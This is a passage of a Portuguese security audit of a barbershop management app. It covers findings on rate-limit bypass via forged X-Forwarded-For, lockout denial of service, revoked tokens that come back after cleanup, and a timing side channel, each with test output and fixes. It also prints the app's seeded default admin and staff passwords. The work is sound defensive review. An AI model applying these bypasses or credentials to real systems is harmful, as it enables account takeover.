- [ ] Registro de operações ativo (art. 37) — ler um CPF gera log
- [ ] Portabilidade com **botão de download** na UI
- [ ] Exportação LGPD não traz agendamentos de outro cliente com o mesmo telefone
- [ ] Nenhum IP de usuário enviado a CDN terceiro

**Ferramentas (ver §7):**

- [ ] `claude plugin marketplace list` mostra `taste-skill`, `ui-ux-pro-max-skill`, `professional-business-writing-skill`, `claude-plugins-official`
- [ ] `claude plugin list` mostra `code-review`, `code-modernization`, `claude-security`, `frontend-design`
- [ ] `claude mcp list` mostra `playwright` e `context-mode`
- [ ] `context-mode doctor` sem `FAIL`
- [ ] `npx playwright install chromium` executado (o `inspect.mjs` do taste-skill precisa do Chrome)
- [ ] `CHROME_PATH` exportado no shell, ou o `inspect.mjs` apontando para o Chromium do Playwright
- [ ] Seção "Como auditar este repositório" presente no `CLAUDE.md`
- [ ] `.claude/commands/auditar.md` presente
- [ ] `.mcp.json` e `.claude/settings.json` versionados no repositório

---

## 🧨 12. Achados complementares da revisão de backend (com prova em runtime)

A revisão de backend rodou o servidor com o `.env` e as dependências do próprio projeto e **testou as hipóteses em vez de inferi-las**. Os itens abaixo são os que **elevam** ou **complementam** os achados das §2–§5. Cada um traz a prova.

### [X-01] 🔴 O rate limit de login é **completamente inerte** — confirmado com 13 tentativas, zero 429

**Arquivo:** `server.js:23` (`app.set("trust proxy", 1)`) + `server.js:68-76`

```
=== identidades distintas + XFF rotacionado (bypass do limiter?) ===
401 401 401 401 401 401 401 401 401 401 401 401 401   <-- 13 tentativas, ZERO 429s

=== identidades distintas, mesmo IP (deveria travar em 10) ===
429 429 429 ...                                          <-- corretamente limitado
```

Com `trust proxy = 1`, o Express deriva `req.ip` do **último** item do `X-Forwarded-For`. Se o app está exposto diretamente (sem proxy reverso), **o cliente controla esse header**. Treze logins falhos consecutivos com `X-Forwarded-For` forjado **nunca** dispararam o limite de 10/15min.

Isso **eleva o P1-02 de HIGH para CRITICAL**: a proteção contra *credential stuffing* não existe.

```js
// Exposição direta (sem proxy):
app.set("trust proxy", false);

// Atrás de exatamente um proxy que você controla:
// o proxy DEVE sobrescrever (não acrescentar) o X-Forwarded-For.
app.set("trust proxy", 1);
const { ipKeyGenerator } = require("express-rate-limit");
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  standardHeaders: true,
  legacyHeaders: false,
  keyGenerator: (req) => ipKeyGenerator(req.socket.remoteAddress),  // nunca o header do cliente
  message: { error: "Muitas tentativas. Tente novamente em 15 minutos." },
});
```

> Nota técnica: o `express-rate-limit` v8 só dispara `ERR_ERL_PERMISSIVE_TRUST_PROXY` quando `trust proxy === true` (verificado em `node_modules/express-rate-limit/dist/index.cjs:381-389`). O valor `1` **passa silenciosamente** e continua falsificável.

### [X-02] 🔴 O lockout é um **DoS não autenticado** contra qualquer conta conhecida

> **🔎 Correção da revisão:** reproduzido para identidades do `.env` e identidades inexistentes. Para contas reais do MySQL o contador nunca é incrementado (ver X-03), então o DoS não atinge essas contas hoje; ele passaria a atingi-las **se** o X-03 for corrigido sem trocar a chave para identidade + IP.

**Arquivo:** `server.js:33-59`, `server.js:249-257`

O contador é chaveado **só pela identidade**, não por identidade+IP:

```
=== travar 'cliente.demo' com 5 senhas erradas (IPs forjados) ===
401 401 401 401 401 429
=== vítima agora entra com a senha CORRETA (de 8.8.8.8) ===
HTTP 429  {"error":"Conta temporariamente bloqueada por excesso de tentativas incorretas."}
```

O cliente legítimo, **com a senha correta**, está bloqueado. Como o contador é por identidade e o limiter é por IP (falsificável, X-01), o atacante pode manter a vítima bloqueada indefinidamente. E-mails de cliente são adivinháveis ou enumeráveis pelo endpoint público de cadastro.

**Correção:**

```js
function lockoutKey(req) {
  const identity = typeof req.body?.identity === "string"
    ? req.body.identity.trim().toLowerCase() : "";
  if (!identity) return null;
  const ip = req.ip || req.socket.remoteAddress || "unknown";
  return `${ip}::${identity}`;          // identidade + IP
}
```

E **só conte falhas de contas que existem** — um identidade inexistente não deve consumir tentativas de uma identidade real.

### [X-03] 🔴 O lockout só protege as contas de demonstração — as contas reais nunca são contadas

**Arquivos:** `server.js:435` (conta) vs `features/cadastro-mysql/client-auth.js:171-173` e `staff-auth.js:78-80` (não contam)

```js
// server.js:435 — o fallback .env registra a falha
recordFailedAttempt(identity);

// client-auth.js:171 — o caminho do banco NÃO registra
if (!passwordMatches) {
  return res.status(401).json({ error: "Usuário ou senha incorretos." });
}
```

Ou seja: um ataque de *guess* contra uma **conta MySQL real** — todo cliente cadastrado, todo membro da equipe — **nunca incrementa o contador**, e o lockout nunca engata exatamente para as contas que importam.

**Correção:** mover o registro para o caminho compartilhado. Os middlewares `clientLogin`/`staffLogin` já recebem dependências por injeção (`server.js:310-328`) — basta passar mais duas:

```js
// server.js
const createClientAuth = require("./features/cadastro-mysql/client-auth");
const { registerRouter, clientLogin } = createClientAuth({
  getPool, generateUserId, createAccessToken, createRefreshToken, activeSessions,
  recordFailedAttempt, clearFailedAttempts,      // ← novos
});
```

```js
// client-auth.js
if (!passwordMatches) {
  recordFailedAttempt(req);        // recebe req → monta a chave id+IP
  return res.status(401).json({ error: "Usuário ou senha incorretos." });
}
```

### [X-04] 🔴 A blacklist é limpa **inteira** e **ressuscita tokens revogados**

**Arquivo:** `server.js:169-175`

```js
function cleanupBlacklist() {
  // Tokens JWT expiram naturalmente, então podemos limpar a blacklist periodicamente
  // Para simplificar, vamos limpar tudo após 15 minutos (tempo de expiração do access token)
  if (tokenBlacklist.size > 1000) {
    tokenBlacklist.clear();          // ← ressuscita TODOS os tokens revogados
  }
}
```

Quando a blacklist cruza 1000 entradas, **todo** token revogado é esquecido de uma vez — inclusive os revogados por logout segundos antes. Eles continuam criptograficamente válidos (15 min de access / 7 dias de refresh).

E há o agravante: `generateUserId` é um **hash determinístico** de `role:identity` (`server.js:111-117`), então quem faz login de novo recebe **o mesmo `userId`** e uma nova sessão — e o token antigo revogado volta a passar nas duas checagens.

```
before logout      : 200 OK
after logout       : 401 blacklisted
after relogin      : 401 blacklisted
blacklist size     : 1002
after cleanup      : 200 OK   <-- token revogado RESURGIDO
```

> O comentário na linha 171 diz "limpar tudo após 15 minutos", mas o código limpa por **tamanho**, não por tempo. O comentário não descreve o comportamento.

**Correção — blacklists por `jti` com expiração exata (access tokens também precisam de `jti`):**

```js
const tokenBlacklist = new Map();   // jti -> exp (epoch ms)

function blacklistToken(decoded) {
  if (!decoded.jti || !decoded.exp) return;
  tokenBlacklist.set(decoded.jti, decoded.exp * 1000);
}

function cleanupBlacklist() {
  const now = Date.now();
  for (const [jti, expMs] of tokenBlacklist) {
    if (expMs <= now) tokenBlacklist.delete(jti);
  }
}
```

E em `authenticate()`, troque a checagem por token bruto pela checagem por `jti`:

```js
if (decoded.jti && tokenBlacklist.has(decoded.jti)) {
  return res.status(401).json({ error: "Sessão encerrada. Faça login novamente." });
}
```

### [X-05] 🔴 O fallback `.env` é um backdoor **com canal de temporização**

**Arquivos:** `server.js:259-305`, `server.js:399-432`, `server.js:371-377`

```js
// server.js:273
if (identity !== expectedLogin || password !== expectedPassword) { ... }
// server.js:408
if (identity === expectedLogin && password === expectedPassword) { ... }
```

Três problemas somados:
1. É uma **porta traseira estática** por perfil, verificada **depois** de o banco falhar. Quem tem `ADMIN_LOGIN`/`ADMIN_PASSWORD` do `.env` obtém um token `admin` **independente de o banco conter qualquer admin**. Deletar a conta admin, trocar a senha ou desativar o registro **não fecha essa porta**. E `POST /auth/login/admin` expõe isso diretamente.
2. A comparação é de **texto puro** (`!==`) — **não é constante no tempo**. A diferença de tempo entre "casa nos primeiros N bytes" e "não casa" permite **reconstituir `ADMIN_PASSWORD` byte a byte pela rede**.
3. Não há `bcrypt`, não há custo de hash.

**Correção — remova o fallback; o MySQL é o sistema de verdade:**

```js
// server.js — apague handleLogin() e o loop de profiles em /auth/login/unified.
// A rota unificada passa a ser: client DB login → staff DB login → 401.
app.post("/auth/login/unified",
  loginLimiter, checkLockoutMiddleware, validateLoginInput,
  clientLogin, staffLogin,
  (req, res) => {
    recordFailedAttempt(req);
    return res.status(401).json({ error: "Usuário ou senha incorretos." });
  }
);
```

Se o fallback precisar sobreviver temporariamente, no mínimo compare em tempo constante e desabilite em produção:

```js
const crypto = require("crypto");
function timingSafeEqualStr(a, b) {
  const ab = Buffer.from(String(a));
  const bb = Buffer.from(String(b));
  if (ab.length !== bb.length) {
    crypto.timingSafeEqual(ab, ab);   // mantém o tempo plano
    return false;
  }
  return crypto.timingSafeEqual(ab, bb);
}

const allowEnvFallback =
  process.env.NODE_ENV !== "production" && process.env.ALLOW_ENV_FALLBACK === "1";
```

### [X-06] 🔴 Concluir → reverter → concluir **duplica a receita no caixa**

**Arquivo:** `features/agenda-mysql/appointments-routes.js:164-218`

O fluxo usa transação (correto) e a inserção no ledger é atômica com a atualização do agendamento (correto). **Mas o fluxo não é reversível:**

| Sequência | Resultado |
|---|---|
| `pendente` → `concluido` | insere lançamento de R$ 85,00 ✅ |
| → `cancelado` | **o lançamento de R$ 85,00 permanece no caixa para sempre** ❌ |
| → `concluido` de novo | a guarda `appData.status !== 'concluido'` passa (status atual = `cancelado`) → **insere um SEGUNDO lançamento de R$ 85,00** ❌ |
| `DELETE /api/appointments/:id` (`hard delete`) | **órfão**: o lançamento sobrevive sem agendamento que o referencie ❌ |
| `DELETE /api/sales/:id` (soft delete, `active = 0`) | a venda some, mas **o lançamento correspondente continua ativo** ❌ |

Resultado: a agenda e o caixa **divergem permanentemente** — que é exatamente o pilar que o relatório de auditoria anterior dava como "5,5/10, crítico".

**Correção — o lançamento é filho do agendamento e reverte com ele:**

```sql
ALTER TABLE transactions
  ADD COLUMN source_type VARCHAR(20) NULL,
  ADD COLUMN source_id INT NULL,
  ADD INDEX idx_transactions_source (source_type, source_id);
```

```js
// ao concluir:
await connection.query(
  `INSERT INTO transactions (description, category, type, amount, payment_method, transaction_date, source_type, source_id)
   VALUES (?, 'Serviços', 'entrada', ?, 'PIX', ?, 'appointment', ?)`,
  [`Atendimento: ${appData.service_name} (${appData.client_name})`, appData.service_price,
   appData.appointment_date, id]
);

// ao sair do estado concluído:
if (status !== 'concluido' && appData.status === 'concluido') {
  await connection.query(
    "UPDATE transactions SET active = 0 WHERE source_type = 'appointment' AND source_id = ? AND active = 1",
    [id]
  );
}
```

E o `DELETE /api/appointments/:id` deve, **na mesma transação**, cancelar o agendamento (soft delete) e desativar o lançamento.

### [X-07] 🔴 O preço do serviço é **definido pelo cliente**, não pelo catálogo

**Arquivo:** `features/agenda-mysql/appointments-routes.js:100, 137`

O próprio schema avisa o que deveria acontecer:

```sql
-- features/servicos-mysql/schema.sql:3
-- Em agendamentos, copie preço e duração para snapshots: não use o valor atual do catálogo para históricos.
```

Mas o valor vem do **body da requisição**:

```js
service_price,   // ← do cliente
```

Quem cria o agendamento escolhe o preço. E **é esse preço falso que vai para o caixa** quando o atendimento é concluído (`appointments-routes.js:201`). Um agendamento de R$ 500,00 lançado a R$ 0,01.

**Correção — resolver o preço no servidor:**

```js
const [svcRows] = await connection.query(
  "SELECT id, name, price FROM services WHERE id = ? AND active = 1 LIMIT 1",
  [Number(service_id)]
);
if (svcRows.length === 0) {
  await connection.rollback();
  return res.status(400).json({ error: "Serviço inválido." });
}
const svc = svcRows[0];
// ... INSERT usa svc.id, svc.name, svc.price
```

### [X-08] 🟠 A checagem de conflito de horário é contornável por **um espaço em branco**

**Arquivo:** `features/agenda-mysql/appointments-routes.js:117-122`

```sql
SELECT id FROM appointments
 WHERE staff_name = ? AND appointment_date = ? AND appointment_time = ? AND status != 'cancelado'
 LIMIT 1 FOR UPDATE
```

O conflito é chaveado por `staff_name` — **texto livre**. `"João"`, `"joão"`, `"João "` (com espaço) e `"J-o-a-o"` são **quatro agendamentos diferentes** para o mesmo barbeiro: o collation do MySQL é case-insensitive, mas **não** whitespace-insensitive. Um espaço final basta para o *double-booking* passar.

**Correção:** chaves pelo identificador estável (`staff_id`), com o nome apenas como snapshot:

```js
if (!Number.isInteger(Number(staff_id)) || Number(staff_id) <= 0) {
  await connection.rollback();
  return res.status(400).json({ error: "Profissional inválido." });
}
const [existing] = await connection.query(
  `SELECT id FROM appointments
    WHERE staff_id = ? AND appointment_date = ? AND appointment_time = ? AND status != 'cancelado'
    LIMIT 1 FOR UPDATE`,
  [Number(staff_id), appointment_date, appointment_time]
);
```

E o schema precisa do `UNIQUE` gerado (ver P1-06).

### [X-09] 🟠 `Number(amount) <= 0` **não rejeita `NaN`** — o valor chega ao banco como texto

**Arquivos:** `features/financeiro-mysql/finance-routes.js:72` · `features/vendas-mysql/sales-routes.js:80`

```js
if (Number(amount) <= 0) {
  return res.status(400).json({ error: "O valor da transação deve ser maior que zero." });
}
```

`Number("abc")` é `NaN`, e **`NaN <= 0` é `false`** (verificado). Então `"abc"` **passa** a validação e chega ao MySQL como a string `'abc'` → erro de conversão em `DECIMAL` → **500 em vez de 400**.

**Correção:**

```js
const amountNum = Number(amount);
if (!Number.isFinite(amountNum) || amountNum <= 0 || amountNum > 99999999.99) {
  return res.status(400).json({ error: "O valor da transação deve ser um número positivo." });
}
if (!["entrada", "saida"].includes(type)) {
  return res.status(400).json({ error: "Tipo inválido. Use 'entrada' ou 'saida'." });
}
```

### [X-10] 🟠 `||` trata `0` como ausente e **inventa dados**

**Arquivos:** `features/clientes-mysql/clients-routes.js:53` · `features/produtos-mysql/products-routes.js:74, 77`

```js
loyaltyPoints: row.loyalty_points || 12,   // cliente com 0 pontos aparece com 12
cost_price: cost_price || 0.00,
min_stock: min_stock || 5,                  // min_stock: 0 (sem mínimo) vira 5 → alerta falso
```

**Correção — coalescência nula (`??`), que só cai para o padrão em `null`/`undefined`:**

```js
loyaltyPoints: row.loyalty_points ?? 12,
cost_price: cost_price ?? 0.00,
min_stock: min_stock ?? 5,
```

### [X-11] 🟠 A tabela `transactions` é definida em **3 lugares diferentes** — o primeiro a subir vence

| Local | Índices |
|---|---|
| `features/financeiro-mysql/finance-routes.js:3-20` | `idx_transaction_date`, `idx_transaction_type` |
| `features/vendas-mysql/sales-routes.js:20-35` | **nenhum** |
| `features/agenda-mysql/appointments-routes.js:27-42` | **nenhum** |
| `features/financeiro-mysql/schema.sql:2-15` | ambos |

Como todas usam `CREATE TABLE IF NOT EXISTS`, **a primeira definição executada vence** e as outras são ignoradas em silêncio. Qual router receber tráfego primeiro define o schema real — e como `appointments` e `sales` referenciam `transactions` sem criá-la com os índices, a existência dos índices depende da **ordem de startup**.

**Correção:** defina a tabela **uma vez**, num módulo de migração compartilhado, e importe.

### [X-12] 🟠 Express 5: `req.body` é `undefined` quando o `Content-Type` não é parseável → **500 em vez de 400**

> **🔎 Correção da revisão:** reproduzido: `Content-Type: text/plain` em `/auth/login/unified` e `/auth/refresh` retorna 500. `/api/register` já responde 400 corretamente.

**Arquivo:** `server.js:250, 261, 445` (não protegem o acesso a `req.body`)

No Express 5 / body-parser 2.x, `req.body` é **`undefined`** se o `Content-Type` não for reconhecido pelo `express.json()`. Confirmado em runtime:

```
POST /auth/login/unified  Content-Type: text/plain  →  500
POST /auth/login/unified  body > 100 kB             →  500
```

O `client-auth.js:49-51` **acerta** (`if (!body || typeof body !== "object")`); o `server.js` **não**.

```js
function validateLoginInput(req, res, next) {
  const { identity, password } = req.body ?? {};      // ← ?? {}
  // ...
}

function checkLockoutMiddleware(req, res, next) {
  const identity = typeof req.body?.identity === "string" ? req.body.identity : null;
  // ...
}

app.post("/auth/refresh", refreshLimiter, (req, res) => {
  const refreshToken = typeof req.body?.refreshToken === "string" ? req.body.refreshToken : null;
  // ...
});
```

E o middleware de erro deve respeitar `err.status` e `res.headersSent`:

```js
app.use((err, req, res, next) => {
  logger.error({ err, actor: req.user?.userId, path: req.path }, "request failed");
  if (res.headersSent) return next(err);
  const status = Number.isInteger(err.status) && err.status >= 400 && err.status < 600 ? err.status : 500;
  res.status(status).json({ error: status === 500 ? "Erro interno do servidor." : err.message });
});
```

### [X-13] 🟠 `SELECT *` expõe o **custo do produto** (a margem do negócio)

**Arquivos:** `features/produtos-mysql/products-routes.js:33, 82, 104` · `finance-routes.js:32` · `sales-routes.js:47` · `appointments-routes.js:152, 183, 209`

```js
let query = "SELECT * FROM products WHERE active = 1";
```

`cost_price` é o **preço de compra** — ou seja, a margem. Ele não deveria ir para a lista. E, como a rota está hoje acessível a um token `client` (P0-01), um cliente cadrado lê a margem da loja inteira.

**Correção:**

```js
const PRODUCT_PUBLIC = "id, name, description, sale_price, stock, min_stock, category, active, created_at, updated_at";
const PRODUCT_FULL   = "id, name, description, cost_price, sale_price, stock, min_stock, category, active, created_at, updated_at";

const cols = req.user.role === "admin" ? PRODUCT_FULL : PRODUCT_PUBLIC;
let query = `SELECT ${cols} FROM products WHERE active = 1`;
```

### [X-14] 🟠 A exportação LGPD casa agendamentos por **telefone** — vaza o histórico de outra pessoa

**Arquivo:** `features/clientes-mysql/clients-routes.js:199-202`

```js
const [appointments] = await pool.query(
  "SELECT * FROM appointments WHERE client_id = ? OR client_phone = ?",
  [clientData.id, clientData.phone]
);
```

O `OR client_phone = ?` casa **qualquer** agendamento com o mesmo telefone, independente de quem o possui. Se a família compartilha um aparelho, a exportação LGPD de um membro puxa o histórico de agendamentos do outro — **serviço, profissional, datas, notas**.

Isso é pior do que um bug comum, porque acontece **dentro de um endpoint de conformidade**, onde o usuário está exercendo um direito legal.

**Correção:**

```js
const [appointments] = await pool.query(
  `SELECT id, client_id, client_name, client_phone, service_id, service_name, service_price,
          staff_id, staff_name, appointment_date, appointment_time, status, notes, created_at
     FROM appointments
    WHERE client_id = ?`,
  [clientData.id]
);
```

E o `SELECT * FROM clients` da linha 188 também deve enumerar colunas — hoje o `delete clientData.password_hash` funciona, mas **qualquer coluna sensível futura é exportada automaticamente** até alguém lembrar de adicioná-la à lista de remoção.

### [X-15] 🟡 `/auth/validate-access` é um **oráculo enganoso** — deve ser removido

**Arquivo:** `server.js:539-564`

```js
app.post("/auth/validate-access", authenticate(), (req, res) => {
  const { requiredRoles } = req.body;    // ← o CHAMADOR diz quais roles checar
  const { role } = req.user;
  const hasAccess = requiredRoles.includes(role);
```

O endpoint pergunta ao **chamador** quais roles checar e responde se o chamador tem um deles. Ele **não concede nada e não protege nada** — mas o nome e a forma invitam o desenvolvedor a acreditar que é uma checagem de autorização. A checagem real acontece em `authenticate(requiredRoles)` em cada rota. Ele ainda ecoa `requiredRoles` e `userRole` de volta ao cliente.

**Correção:** apague. Se o frontend precisa saber o role atual, `GET /auth/session` (`server.js:525`) já devolve.

### [X-16] 🟡 `jwt.verify` não fixa o algoritmo

**Arquivo:** `server.js:202-205` e `server.js:454-457`

```js
const decoded = jwt.verify(token, JWT_SECRET, {
  issuer: JWT_ISSUER,
  audience: JWT_AUDIENCE,
});
```

Sem `algorithms`, o conjunto aceito é inferido do tipo da chave. O `jsonwebtoken` v9 **rejeita** `alg: none` para chaves HMAC (verificado: `JsonWebTokenError: jwt signature is required`), então **não é explorável hoje** — mas é defesa em profundidade contra regressão e contra troca futura do tipo de chave (trocar para RSA e assinar com `HS256` usando a chave pública).

```js
const decoded = jwt.verify(token, JWT_SECRET, {
  issuer: JWT_ISSUER,
  audience: JWT_AUDIENCE,
  algorithms: ["HS256"],       // ← fixe
});
```

### [X-17] 🟡 `LIKE` sem escape — o usuário pode enumerar a tabela inteira

**Arquivos:** `products-routes.js:36-39` · `finance-routes.js:42` · `sales-routes.js:52` · `appointments-routes.js:64, 74`

```js
query += " AND (name LIKE ? OR description LIKE ?)";
params.push(`%${search}%`, `%${search}%`);
```

O placeholder impede SQL injection, mas o `%` e o `_` do usuário são interpretados como **wildcards** do `LIKE`. Buscar por `%` traz **todas** as linhas; `_` casa qualquer caractere. Não é injeção, é um filtro escapável — e força varredura completa.

```js
function likeParam(value) {
  return `%${String(value).replace(/[\\%_]/g, (m) => `\\${m}`)}%`;
}
params.push(likeParam(search), likeParam(search));
// e no SQL: "... LIKE ? ESCAPE '\\'"
```

### [X-18] 🟡 `connection.release()` chamado duas vezes (idempotente hoje, frágil por acidente)

**Arquivos:** `appointments-routes.js:110, 126` + `:159` · `sales-routes.js:76, 81` + `:151`

```js
if (!client_name || ...) {
  connection.release();          // ← libera aqui
  return res.status(400).json({ ... });
}
// ...
} finally {
  connection.release();          // ← e libera de novo
}
```

O `mysql2` protege com a flag `_released` (`node_modules/mysql2/lib/pool_connection.js:19-29`), então **hoje não corrompe o pool** — verificado no código instalado. Mas a correção depende de um detalhe de implementação de terceiro, não da estrutura do próprio código, e quebra se o `release()` deixar de ser idempotente ou se o `finally` for refatorado para fazer trabalho real.

**Correção — um helper de transação com **um único** caminho de release:**

```js
// lib/transaction.js
async function withTransaction(getPool, fn) {
  const connection = await getPool().getConnection();
  try {
    await connection.beginTransaction();
    const result = await fn(connection);
    await connection.commit();
    return result;
  } catch (err) {
    await connection.rollback();
    throw err;
  } finally {
    connection.release();     // caminho único — release duplo é impossível
  }
}
```

### [X-19] 🟡 Custo de bcrypt 10 está abaixo da recomendação atual

**Arquivos:** `client-auth.js:119` · `staff-auth.js:203` · `staff-table.js:36-37`

Custo 10 era razoável por volta de 2014. A orientação atual (OWASP Password Storage Cheat Sheet) é **12 ou mais**. No hardware moderno, 12 leva o custo por hash de ~60 ms para ~250 ms.

```js
const BCRYPT_COST = 12;
const passwordHash = await bcrypt.hash(password, BCRYPT_COST);
```

> ⚠️ **Ordem importa:** corrija o bypass do limiter (X-01) **antes** de subir o custo — os dois juntos viram um amplificador de DoS.

E: o `bcryptjs` é implementação **pura em JavaScript**, ~30–40% mais lenta que o `bcrypt` nativo para o mesmo custo. Considere trocar depois que o limiter estiver corrigido.

### [X-20] 🟡 Refresh tokens guardados em **texto puro** na memória do servidor

**Arquivo:** `server.js:26, 288-294`

```js
const activeSessions = new Map();   // userId -> { refreshToken, createdAt, lastUsed }
```

Um dump de memória (core dump, heap snapshot, debugger) entrega **refresh tokens prontos para uso**. A mitigação padrão é guardar um **hash** do token e comparar hashes — o valor cru só existe transitoriamente na emissão.

```js
function hashToken(token) {
  return crypto.createHash("sha256").update(token).digest("hex");
}
// na emissão:
activeSessions.set(userId, { refreshTokenHash: hashToken(refreshToken), ... });
// no refresh (server.js:468):
if (!userSession || userSession.refreshTokenHash !== hashToken(refreshToken)) { ... }
```

### [X-21] 🟡 `mysql2` escapa no **cliente**, não no servidor — prefira `execute()`

**Arquivo:** todas as queries

O `pool.query()` do `mysql2` faz escape **client-side** via `sql-escaper` (`node_modules/mysql2/lib/base/connection.js:648-676` → `SqlString.format`) — os valores são interpolados no texto SQL antes de sair pela rede. **Ainda é seguro contra injeção** (o escaper trata aspas e barras), mas `pool.execute()` usa o **protocolo binário**, com prepared statements reais no servidor, reaproveitamento de statement e nenhuma dúvida sobre a camada de escape.

```js
const [rows] = await pool.execute(
  "SELECT id, name FROM staff_users WHERE email = ? LIMIT 1",
  [email]
);
```

> ⚠️ `execute()` **rejeita `undefined`** (`Bind parameters must not contain undefined`), enquanto `query()` converte silenciosamente em `NULL`. Vários handlers repassam campos de `req.body` que podem ser `undefined` (ex.: `products-routes.js:97-101`) — normalize `undefined → null` antes de trocar.

### [X-22] 🟡 Um placeholder de 43 caracteres **passa** na validação de força do segredo

**Histórico:** commit `1a899f5` continha um `.env.example` com
`JWT_SECRET=Insira uma chave de alta aleatoriedade aqui` — **43 caracteres**, que **passa** no check `length < 32` de `server.js:19-21`. Quem copiasse o arquivo verbatim rodaria a aplicação com uma chave de assinatura pública.

O arquivo foi removido no commit `b611ba2` e não está na árvore atual — mas o modo de falha é real e o `.env.example` **não existe** hoje, o que é o oposto do desejável.

**Correção:**

```js
const PLACEHOLDERS = new Set([
  "Insira uma chave de alta aleatoriedade aqui",
  "CHANGE_ME_GENERATE_WITH_openssl_rand_base64_48",
]);
if (!JWT_SECRET || JWT_SECRET.length < 32 || PLACEHOLDERS.has(JWT_SECRET)) {
  throw new Error("JWT_SECRET ausente, fraco ou ainda com valor de exemplo.");
}
```

### [X-23] 🟡 Detalhes de configuração que importam em produção

| Item | Onde | Impacto |
|---|---|---|
| **`upgrade-insecure-requests`** na CSP | `server.js:63` (default do helmet) | Em deploy HTTP puro, **todo** asset da própria origem é reescrito para HTTPS e falha. Desabilite quando `!req.secure`. |
| **HSTS enviado por HTTP** | idem | O header é ignorado em HTTP, mas passa a valer no instante em que TLS entrar — inclusive para `includeSubDomains` que talvez não estejam prontos. |
| **Servidor escuta em todas as interfaces** | `server.js:582` | `app.listen(port)` liga em `::`/`0.0.0.0`, mas o log diz `localhost`. Se a máquina tem IP público, a API está diretamente exposta — **é o que torna o bypass de XFF (X-01) diretamente explorável**. Use `app.listen(PORT, HOST)` com `HOST=127.0.0.1` por padrão. |
| **`express.urlencoded({ extended: true })`** | `server.js:66` | Não há endpoint form-encoded no projeto — remova. `extended: true` habilita parsing de objeto aninhado e mais superfície de ataque via `qs` (que o `npm audit` já sinalizou). Fique só com `express.json()`. |
| **Sem CORS explícito** | — | O default do Express (sem header CORS) é **seguro** — mas é um *default*, não uma *decisão*. Documente que a ausência é intencional, ou adicione uma allowlist explícita se um frontend cross-origin entrar. |
| **`/api/health` sem auth** | `server.js:84-89` | Nomeia o produto. Baixo impacto, mas é reconhecimento gratuito. |

### [X-24] ✅ Backend — o que está muito bem feito

Vale registrar, porque são as partes que a maioria dos projetos erra:

- **Rotação de refresh token** (`server.js:474-487`) — emite novo, invalida o antigo, verificado em runtime.
- **Separação de tipo de token** (`type: "refresh"` / `type: "access"`) — um refresh token **não** serve como access token.
- **Verificação de `iss`/`aud`** em ambos os caminhos.
- **Login com tempo equalizado** — `DUMMY_HASH` comparado quando o usuário não existe, impedindo enumeração por tempo de resposta. **Detalhe genuinamente sofisticado.**
- **Prevenção de enumeração no cadastro** — retorna `201` genérico mesmo quando o e-mail já existe ou é da equipe.
- **Senha de 72 bytes recusada, não truncada** — `client-auth.js:75-77`, `staff-auth.js:168-170`. Isso evita o bug clássico do bcrypt.
- **`jti` de 128 bits** nos refresh tokens (`crypto.randomBytes(16)`).
- **Proteção do último admin** (`staff-auth.js:269-277`) e **auto-inativação** (`:263-267`).
- **Sessão derrubada ao inativar um membro da equipe** (`staff-auth.js:283-285`).
- **`role` vem do banco, nunca do request** (`staff-auth.js:63-85`) — **sem escalação de privilégio via body**. Many audit passes flag this as a bug; it is correctly implemented.
- **Zero SQL injection, zero NoSQL injection, zero command injection** — todas as queries parametrizadas; as duas únicas interpolações em SQL (`${column}` e `${SERVICE_COLUMNS}`) são literais de código, nunca dados do usuário.
- **Zero N+1** — nenhuma query dentro de loop.
- **`await` correto em toda parte** — nenhuma chamada não aguardada.
- **Respostas de erro limpas** — nenhum stack trace, SQL ou `err.message` vaza para o cliente.
- **Hash de senha nunca sai da API** — os mappers `toApi` e a exportação LGPD excluem `password_hash`.

### [X-25] 📋 Anexo — verificado por execução vs. inferido por leitura

**Verificado executando o código** (servidor com o `.env` e as dependências do próprio projeto):

- Token `role: "client"` passa na autorização de `/api/finance`, `/api/products`, `/api/appointments`, `/api/sales`; é bloqueado (403) em `/api/services`, `/api/clients`, `/api/staff-users`.
- Limiter de login contornado por `X-Forwarded-For` rotacionado (13 tentativas, zero 429).
- Lockout nega a senha **correta** da vítima bloqueada.
- Rotação de refresh funciona: token antigo rejeitado, novo continua funcionando.
- Blacklist rejeita token de logout — e um `cleanupBlacklist()` o **ressuscita** (réplica fiel das funções exatas).
- Bodies malformados / não-JSON produzem **500**, não 400 (Express 5: `req.body` é `undefined`).
- Body acima de 100 kB produz **500**.
- A CSP do helmet bloqueia os 9 `<script>` inline (erro de console capturado com o texto exato da violação e o hash `sha256-` que o navegador esperava).
- As senhas padrão seedadas são `AdminPassword2026!` / `StaffPassword2026!` e estão documentadas em arquivo **rastreado pelo git** (`CREDENCIAIS-DEBUG.md`).
- `.env` nunca foi commitado ✅. Um `.env.example` existiu historicamente com placeholder de 43 caracteres que **passa** no check de ≥32.
- `bcryptjs` **trunca silenciosamente** em 72 bytes ao comparar (`compareSync('A'.repeat(100), hashOf72)` → `true`) — os caminhos de cadastro pre-emptam isso corretamente.
- `NaN <= 0` é `false` → os guards `Number(amount) <= 0` não rejeitam valores não-numéricos.
- `undefined` passado via `pool.query()` vira `NULL`; `pool.execute()` lançaria.
- `PoolConnection.release()` do mysql2 é idempotente (flag `_released`), então o release duplo não corrompe o pool hoje.

**Inferido por leitura estática** (não exercitável sem MySQL):

- Que o token de cliente consegue de fato ler/gravar o ledger, as vendas, os produtos e os agendamentos. **A decisão de autorização está confirmada**; o efeito a jusante decorre da leitura linha a linha dos handlers.
- Os textos exatos de erro do MySQL para valores fora de faixa.
- A inconsistência financeira do X-06 (reversão deixa órfão; re-conclusão duplica) — derivada da lógica de transição de status em `appointments-routes.js:195` e da ausência de qualquer estorno nos handlers `DELETE`.

**Explicitamente NÃO encontrado:** SQL injection, NoSQL injection, command injection, IDOR nas rotas de cliente, path traversal, SSRF, CSRF (corretamente não aplicável, dado que a auth é por header), hashes de senha em qualquer resposta de API e stack traces em qualquer resposta.

---

## 📄 13. Apêndice — README.md proposto

```markdown
# Barber-Select

Plataforma de gestão para barbearias: agenda, clientes, equipe, estoque e caixa
em um só lugar. Dois painéis — área do cliente e painel da equipe — mais uma
landing page de marketing.

![Barber-Select](public/assets/LOGO.png)

## Stack

- **Backend:** Node.js + Express 5, MySQL (`mysql2/promise`), JWT com rotação de
  refresh token, Helmet, bcrypt
- **Frontend:** HTML/CSS/JS puro, sem build step. Design tokens em
  `public/styles/tokens.css`, ícones BoxIcons, tipografia Playfair Display + DM Sans

## Requisitos

- Node.js 20 LTS ou superior
- MySQL 8.0 ou superior (MariaDB 10.6+ também funciona)

